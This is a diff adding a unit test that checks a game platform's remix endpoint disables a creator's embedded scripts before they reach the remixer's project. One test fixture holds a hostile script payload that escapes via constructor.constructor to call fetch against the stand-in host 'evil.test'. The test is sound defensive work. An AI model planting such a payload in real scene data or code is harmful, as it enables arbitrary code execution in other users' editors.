@@ -164,5 +164,84 @@ describe('POST /api/play/[userId]/[slug]/remix', () => {
       'My Game (Remix)',
       { entities: [] }
     );
+    expect(body.quarantinedScripts).toBe(0);
+  });
+
+  it('disables the creator\'s scripts before they reach the remixer\'s project', async () => {
+    // The scene JSON a publisher controls carries executable source
+    // (engine ScriptData). createProject must never be handed it enabled — the
+    // remixer's editor compiles enabled scripts with Function(). See #9455.
+    const { safeAuth } = await import('@/lib/auth/safe-auth');
+    vi.mocked(safeAuth).mockResolvedValue({ userId: 'clerk-remixer' });
+
+    const { createProject } = await import('@/lib/projects/service');
+    vi.mocked(createProject).mockResolvedValue({
+      id: 'forked-project-id',
+      name: 'My Game (Remix)',
+      userId: 'remixer-uuid',
+      sceneData: {},
+      entityCount: 0,
+      formatVersion: 1,
+      thumbnail: null,
+      theme: null,
+      createdAt: new Date(),
+      updatedAt: new Date(),
+    });
+
+    const { getDb } = await import('@/lib/db/client');
+    const mockDb = {
+      select: vi.fn().mockReturnThis(),
+      from: vi.fn().mockReturnThis(),
+      where: vi.fn().mockReturnThis(),
+      limit: vi.fn(),
+      insert: vi.fn().mockReturnThis(),
+      values: vi.fn().mockReturnThis(),
+      returning: vi.fn().mockResolvedValue([{ id: 'fork-record-id' }]),
+    };
+    vi.mocked(getDb).mockReturnValue(mockDb as unknown as ReturnType<typeof getDb>);
+
+    const hostile = "(0).constructor.constructor('return fetch')()('https://evil.test')";
+    const sourceScene = {
+      formatVersion: 1,
+      entities: [
+        { id: 1, scriptData: { source: hostile, enabled: true } },
+        { id: 2 },
+        { id: 3, scriptData: { source: 'game.score += 1', enabled: true } },
+      ],
+    };
+
+    mockDb.limit.mockResolvedValueOnce([{ id: 'remixer-uuid' }]);
+    mockDb.limit.mockResolvedValueOnce([{ id: 'creator-uuid' }]);
+    mockDb.limit.mockResolvedValueOnce([{
+      id: 'game-uuid',
+      title: 'My Game',
+      projectId: 'orig-project-id',
+    }]);
+    mockDb.limit.mockResolvedValueOnce([{ sceneData: sourceScene }]);
+
+    const { POST } = await import('./route');
+    const req = new NextRequest('http://localhost/api/play/user-1/my-game/remix', {
+      method: 'POST',
+    });
+
+    const res = await POST(req, {
+      params: Promise.resolve({ userId: 'user-1', slug: 'my-game' }),
+    });
+
+    expect(res.status).toBe(201);
+    expect(await res.json()).toMatchObject({ quarantinedScripts: 2 });
+
+    const handedOver = vi.mocked(createProject).mock.calls[0][2] as {
+      entities: Array<{ scriptData?: { source: string; enabled: boolean } }>;
+    };
+    expect(handedOver.entities.map((e) => e.scriptData?.enabled)).toEqual([
+      false,
+      undefined,
+      false,
+    ]);
+    // Quarantined, not scrubbed: the remixer can still read and adapt it.
+    expect(handedOver.entities[0].scriptData?.source).toBe(hostile);
+    // And the row we read from is untouched.
+    expect(sourceScene.entities[0].scriptData?.enabled).toBe(true);
   });
 });
